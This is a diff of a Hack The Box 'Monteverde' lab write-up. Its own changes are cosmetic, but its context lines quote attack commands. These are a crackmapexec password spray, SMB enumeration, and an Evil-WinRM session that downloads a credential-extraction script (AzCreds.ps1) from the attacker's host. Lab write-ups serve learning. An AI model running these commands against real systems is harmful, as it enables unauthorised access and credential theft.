@@ -607,7 +607,7 @@ crackmapexec smb <YOUR_IP> -u users -p users [https://github.com/byt3bl33d3r/Cra
 
 ## Initial Foothold
 
-### Enumeration as user `SABatchJobs` 🐇
+### Enumeration as user `SABatchJobs` 
 
 ```text
 kac0@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK -L \\\\<YOUR_IP>\\ -U SABatchJobs
@@ -977,7 +977,7 @@ At line:1 char:1
 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
     + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
-    
+
 *Evil-WinRM* PS C:\Users\mhope\documents> wget http://10.10.14.253:8099/AzCreds.ps1 -UseBasicParsing
 
 StatusCode        : 200
